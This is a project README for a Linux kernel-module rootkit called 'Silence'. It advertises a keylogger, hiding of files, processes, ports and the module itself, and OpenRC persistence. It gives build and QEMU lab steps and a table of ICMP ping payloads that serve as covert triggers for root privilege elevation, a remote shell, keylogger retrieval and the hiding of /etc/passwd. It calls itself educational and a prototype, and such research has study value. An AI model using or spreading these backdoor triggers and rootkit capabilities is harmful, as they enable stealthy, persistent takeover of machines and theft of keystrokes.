# Description

> [!Important]
> This rootkit is for educational and research purposes only.
> This project is a prototype, and not fully functionnal.

Kprobe-based LKM rootkit. With ICMP communication and Keylogger.

![image](https://images7.alphacoders.com/885/885118.jpg)

# Overview

* ICMP communication
* Keylogger
* File hide
* PID hide
* Port hide
* LKM hide
* Openrc Persistence

# Build

## Quick start

```bash
git clone https://github.com/MikeHorn-git/Silence
cd Silence
make
```

## Makefile

```makefile
Usage: make <target>
Targets:
  help         Display this help message
  all          Build LKM
  clean        Clean LKM
  dist         Create tar archive release
  format       Format all .c, .h files with clang-format
```

# Dev Environment

Build the rootkit before

## Prepare

```bash
mkdir /tmp/qemu-share
cp -r ./src /tmp/qemu-share
cd ./test/qemu
```

## Download Kernel

```bash
./download.sh
```

## Build Qemu

```bash
./build.sh <path_to_bzImage>
```

## Run Qemu

```bash
./run.sh
```

Default credential is root:password

## Load LKM

```bash
sh /mount.sh
sh /network.sh
insmod /tmp/share/src/silence.ko
depmod
```

## Interact

> [!Important]
> Do not using ping from [Busybox](https://www.busybox.net/)

```ping -p <code> -c 1 8.8.8.8```

### Elevate process privilege

```ping -p ca550100000000000000000000000000 -c 1 8.8.8.8```

### Launch a remote shell

```ping -p ff -c 1 8.8.8.8```

### Get a keylogger records

```ping -p ba -c 1 8.8.8.8```

### Hide process

```ping -p de550100000000000000000000000000 -c 1 8.8.8.8```

### Hide passwd file

```ping -p ad017061737377640000000000000000 -c 1 8.8.8.8```

### Restore

```ping -p ad007061737377640000000000000000 -c 1 8.8.8.8```

### Unable to open /etc/passwd

```ping -p fe012f6574632f706173737764000000 -c 1 18.8.8.8```

### Restore

```ping -p fe002f6574632f706173737764000000 -c 1 18.8.8.8```

# Authors

* [p2lu](https://github.com/p2lu)
* [exhyl](https://github.com/hnopew)
* [MikeHorn-git](https://github.com/MikeHorn-git)
